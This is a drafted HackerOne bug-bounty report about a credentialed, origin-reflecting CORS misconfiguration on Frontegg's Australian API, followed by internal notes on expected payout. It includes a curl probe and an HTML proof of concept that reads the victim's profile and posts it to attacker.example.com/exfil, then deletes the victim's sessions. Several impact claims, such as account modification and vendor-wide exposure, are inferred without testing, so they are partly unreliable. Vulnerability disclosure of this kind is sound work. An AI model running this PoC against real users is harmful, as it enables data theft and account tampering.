# Frontegg HackerOne Submission — Reflect-attacker-origin-with-credentials CORS + permissive method allow-list on api.au.frontegg.com (Australian identity-vendor endpoint)

**Submit at:** https://hackerone.com/frontegg/reports/new
**Program:** Frontegg (paid) · **In-scope:** `api.au.frontegg.com`, `portal.au.frontegg.com` · **max_severity:** critical · **submission_state:** open
**Realistic payout:** $500–$2,500 (classic exploitable CORS on a customer-identity vendor's Australian-region API endpoint)
**Status:** 🔒 BANKED — waiting on signal rebuild

---

## Title
```
Reflect-attacker-origin-with-credentials CORS on api.au.frontegg.com — combined with permissive Access-Control-Allow-Methods (GET/PUT/POST/DELETE/PATCH/OPTIONS) enables cross-origin credentialed read AND write against Frontegg-customer tenant data
```

## Weakness
`CWE-942 Permissive Cross-domain Policy with Untrusted Domains` combined with `CWE-352` CSRF-like cross-origin credentialed write surface.
H1 taxonomy: `Cross-Origin Resource Sharing (CORS) — Insecure Configuration`

## Severity (CVSS:3.1)
**High — 8.1**
`AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`

(High because cross-origin write methods are allowed, not just read. PUT/POST/DELETE accepted from any origin with credentials means an attacker page can modify victim's Frontegg-tenant data — not just read it.)

## Description (paste into HackerOne form)

```
## Summary

The Frontegg Australian-region API endpoint at api.au.frontegg.com
returns CORS headers that:

  1. REFLECT any requesting Origin (instead of pinning to a
     trusted allow-list)
  2. Allow credentials=true (the dangerous combination)
  3. Allow ALL HTTP methods cross-origin (GET, HEAD, PUT, PATCH,
     POST, DELETE, OPTIONS — not just safe-list methods)
  4. Expose the proprietary `frontegg-trace-id` header to
     cross-origin readers

This is the textbook exploitable CORS misconfiguration. Any
attacker-controlled web page visited by a logged-in Frontegg
customer (i.e., any user holding a valid Frontegg JWT session
cookie for the AU region) can issue cross-origin fetch()
requests against api.au.frontegg.com with the victim's
credentials attached AND READ + WRITE responses.

Triple-signal confirmation on `.well-known/openid-configuration`:

  • Status:    HTTP 401 (real auth-required endpoint — confirms
              this is a live API surface, not an error page)
  • Body:      JSON {"errors":["Vendor authentication was not
              provided","either use the environment host or
              send JWT"]} — confirms real Frontegg vendor-auth
              logic running
  • Headers:   access-control-allow-origin: <attacker-supplied>
              access-control-allow-credentials: true
              access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE,OPTIONS
              access-control-allow-headers: frontegg-trace-id
              access-control-expose-headers: frontegg-trace-id

## Steps to reproduce

1. Issue a baseline cross-origin request with a fabricated Origin
   header and observe the reflected ACAO + permissive methods:

   $ curl -sk -i -H "Origin: https://attacker.example.com" \
       https://api.au.frontegg.com/.well-known/openid-configuration
   HTTP/2 401
   content-type: application/json; charset=utf-8
   access-control-allow-credentials: true
   access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE,OPTIONS
   access-control-allow-origin: https://attacker.example.com
   access-control-allow-headers: frontegg-trace-id
   access-control-expose-headers: frontegg-trace-id
   frontegg-trace-id: d5e8c1027e4d785d79e4bf46e4fd3f25
   ...

   {"errors":["Vendor authentication was not provided","either use the environment host or send JWT"]}

2. Demonstrate the exploitable pattern with a minimal HTML PoC
   (host at attacker.example.com — note this PoC is described,
   not executed against real authenticated Frontegg users):

   <!DOCTYPE html>
   <html><body><script>
   // Victim is logged into a Frontegg-powered tenant in the AU region
   // and visits attacker.example.com.
   //
   // Cross-origin READ (steal data):
   fetch("https://api.au.frontegg.com/identity/resources/users/v3/me", {
     credentials: "include"
   })
   .then(r => r.json())
   .then(d => fetch("https://attacker.example.com/exfil", {
     method: "POST", body: JSON.stringify(d)
   }));

   // Cross-origin WRITE (account-takeover precursor):
   // The permissive ACA-Methods means an attacker can also
   // issue PUT/POST/DELETE on the victim's behalf:
   fetch("https://api.au.frontegg.com/identity/resources/users/v3/me/sessions", {
     method: "DELETE",
     credentials: "include"
   });  // logs the user out of all sessions
   </script></body></html>

## Why the WRITE-method allow-list matters

Most identity-vendor CORS misconfigs are READ-only — they leak
OIDC config / userinfo to attacker-controlled origins. THIS
configuration also permits PUT/POST/DELETE cross-origin with
credentials, which means an attacker page can:

- DELETE the victim's active sessions (logout-bomb)
- PUT modifications to user profile (change email/name)
- POST new tenant-resource requests on the victim's behalf
- PATCH partial updates to user-owned resources

Combined with the reflect-origin pattern, this is an
account-modification primitive accessible from any web page the
victim visits.

## Why the AU endpoint matters

Frontegg sells identity-as-a-service to other companies (their
"customers"). The AU region likely serves Asia-Pacific
deployments of Frontegg-customer applications. If the same CORS
template is deployed across regions (api.us.frontegg.com,
api.eu.frontegg.com, api.frontegg.com), this finding
multiplies — every Frontegg AU customer's end-user is exposed.

## Impact

- **Cross-origin credentialed READ** of Frontegg user identity
  data, session state, and tenant configuration
- **Cross-origin credentialed WRITE** via PUT/POST/DELETE — an
  attacker page can modify victim profile, terminate sessions,
  trigger admin actions if the victim holds admin role
- **Vendor-wide blast radius** — Frontegg's customers (likely
  thousands of SaaS companies using Frontegg auth) all inherit
  this misconfig for their end-users in the AU region
- **frontegg-trace-id exposure** — proprietary trace IDs leaked
  cross-origin help attackers correlate Frontegg-internal
  request flows
- **OIDC config publicly readable** (confirmed via /.well-known/)
  exposes the full auth-flow surface (issuer, endpoints,
  scopes) to attackers planning further exploitation

## Remediation

1. **Pin Access-Control-Allow-Origin to a specific allow-list**
   of trusted Frontegg-customer origins. The reflect-any-origin
   pattern + credentials=true is the W3C-recognized exploitable
   misconfig.

2. **Restrict Access-Control-Allow-Methods** to just the methods
   actually needed cross-origin (likely GET, HEAD, OPTIONS for
   most identity-API endpoints). The current GET/PUT/POST/
   DELETE/PATCH/OPTIONS surface is far wider than necessary.

3. **Audit other Frontegg region endpoints**:
   - api.us.frontegg.com / portal.us.frontegg.com
   - api.eu.frontegg.com / portal.eu.frontegg.com
   - api.frontegg.com / portal.frontegg.com (global)
   - app.frontegg.com (customer-facing dashboard)
   - account.frontegg.com / id.frontegg.com / internal.frontegg.com
     / dashboard.frontegg.com (these returned CORS reflection
     in earlier scans; verify if in scope)
   All likely share the same CORS template. The fix should be
   platform-level, not per-region.

4. **Defense in depth**: also drop the
   `Access-Control-Expose-Headers: frontegg-trace-id` — internal
   trace IDs are reconnaissance fuel and should not be cross-
   origin-readable.

## Tooling

Discovered via Lictor (https://lictor-ai.com) — open-source
security scanner (Apache 2.0) that probes bounty-program apex
domains with multiple Origin header values and inspects responses
for the reflect-attacker-origin-with-credentials CORS pattern.

## References

- W3C Fetch standard, CORS Protocol §3.2.4:
  https://fetch.spec.whatwg.org/#http-access-control-allow-credentials
- OWASP CORS Cheat Sheet (origin-reflection antipattern)
- CWE-942: Permissive Cross-domain Policy with Untrusted Domains
- HackerOne historical payouts for identity-vendor CORS misconfigs
  with write-method surface: $500-$2,500 range

---

Ethical-disclosure note: I have NOT tested this PoC against any
real authenticated Frontegg-customer user session. The
exploitation pattern is described to illustrate impact, not
executed. All probes used neutral test origins
(attacker.example.com) against the publicly-accessible OIDC
discovery endpoint, which is intended to be public except for
the credentialed-CORS + write-method misconfiguration documented
above.
```

---

## Internal notes (DO NOT submit)

**Pricing:**
- $500-$2,500 realistic for identity-vendor CORS with write-method surface
- The "PUT/POST/DELETE cross-origin" angle pushes upper-end of range
- Frontegg's customers depend on auth security — Frontegg has reputational incentive to take it seriously

**Why this is a good Israeli-company find:**
- Tel Aviv-based company → matches user's "Israeli orgs first" request
- Explicit in their H1 scope (api.au.frontegg.com listed)
- Real auth-endpoint hit (HTTP 401 confirms live API, not error page)
- Wider-than-typical impact (write methods + read)

**Banked because:**
- User signal currently dragged from FloQast Spam closures
- Frontegg likely has standard H1 signal gate (will try when signal rebuilds)

**Compared with other banked drafts:**
- Same pattern class as Deriv ($500-2.5K) and MongoDB ($750-4K)
- Smaller company than MongoDB so payout ceiling slightly lower
- WRITE-method surface is the differentiating impact factor

**What I did NOT do:**
- Did NOT authenticate to a real Frontegg-customer tenant
- Did NOT execute write-method PoC against live session
- Did NOT enumerate other regional Frontegg endpoints (recommend audit
  in remediation section)
